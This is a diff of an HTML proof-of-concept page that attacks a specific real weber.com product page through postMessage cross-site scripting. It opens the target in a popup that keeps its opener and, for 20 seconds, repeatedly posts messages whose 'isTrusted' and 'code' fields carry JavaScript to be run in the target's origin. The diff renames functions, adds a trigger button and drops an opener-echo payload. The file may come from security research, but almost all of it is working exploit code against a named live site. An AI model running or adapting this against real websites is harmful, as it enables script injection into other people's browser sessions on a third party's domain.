@@ -1,37 +1,33 @@
-<!DOCTYPE html>
+<!doctype html>
 <meta charset="utf-8" />
-<title>postMessage XSS PoC — weber.com</title>
+<title>postMessage PoC (requires popup/opener)</title>
 <body>
-
-  postMessage XSS PoC — weber.com
+<button id="go">Open target & send payload</button>
 
 <script>
-const TARGET = "https://www.weber.com/US/en/smoquepelletgrill.html"; // change if needed
-const RUNTIME_MS = 20000;   // total send time
-const INTERVAL_MS = 350;    // send cadence
+const TARGET = "https://www.weber.com/US/en/smoquepelletgrill.html"; // target page
+const RUNTIME_MS = 20000;   // retry window
+const INTERVAL_MS = 350;    // send cadence (ms)
 
-// Add/modify fields if the listener expects e.g. {type:"exec"} or similar
+// Add keys if their handler expects extras (e.g., {type:"exec"})
 const payloads = [
   { isTrusted: true, code: "alert('pwned: '+document.domain)" },
   JSON.stringify({ isTrusted: true, code: "alert('pwned JSON: '+document.domain)" })
 ];
 
-function sendTo(win){
-  for (const p of payloads) { try { win.postMessage(p, "*"); } catch(_){} }
+function postAll(win) {
+  for (const p of payloads) { try { win.postMessage(p, "*"); } catch (_) {} }
 }
 
-document.getElementById('go').onclick = () => {
-  // user gesture -> opener is set, avoids popup blocker
-  const w = window.open(TARGET, "weber_poc", "noopener=false"); // keep opener
-  if (!w) { alert("Popup blocked – allow popups for this page and click again."); return; }
+document.getElementById("go").onclick = () => {
+  // User gesture => popup allowed (if not, browser will show a block bar)
+  const w = window.open(TARGET, "weber_poc"); // do NOT use noopener/noreferrer
+  if (!w) { alert("Popup blocked. Allow popups for this page and click again."); return; }
 
-  // retry for late-loaded code / SPA transitions
   const t0 = Date.now();
   const timer = setInterval(() => {
     if (Date.now() - t0 > RUNTIME_MS) { clearInterval(timer); return; }
-    sendTo(w);
-    // also try posting back to ourselves (some handlers echo to opener)
-    try { w.postMessage({ isTrusted:true, code:"window.opener && window.opener.postMessage('OPENER_OK','*')" }, "*"); } catch(_){}
+    postAll(w);          // send to target (expects event.source === window.opener)
   }, INTERVAL_MS);
 };
 </script>
